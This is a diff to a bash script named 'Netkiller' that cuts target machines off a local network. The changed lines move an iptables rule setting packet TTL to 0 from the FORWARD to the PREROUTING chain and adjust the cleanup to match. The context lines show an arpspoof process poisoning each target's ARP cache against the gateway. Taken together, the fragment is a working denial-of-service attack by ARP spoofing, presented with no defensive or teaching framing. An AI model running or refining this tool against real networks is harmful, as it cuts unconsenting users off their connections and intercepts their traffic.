@@ -218,7 +218,7 @@ for TARGET in "${TARGETS[@]}"; do
     echo "Netkiller killed the target IP: $TARGET"
 
     # Iptables rules
-    iptables -t mangle -I FORWARD -d "$TARGET" -j TTL --ttl-set 0
+    iptables -t mangle -I PREROUTING -s "$TARGET" -j TTL --ttl-set 0
     
     # Bidirectional blocking
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
@@ -239,7 +239,7 @@ cleanup() {
     ip -s -s neigh flush all >/dev/null 2>&1
     iptables -P FORWARD ACCEPT
     iptables -F FORWARD
-    iptables -t mangle -F FORWARD
+    iptables -t mangle -F PREROUTING
     echo ""
     echo "Restoring the connection..."
 }
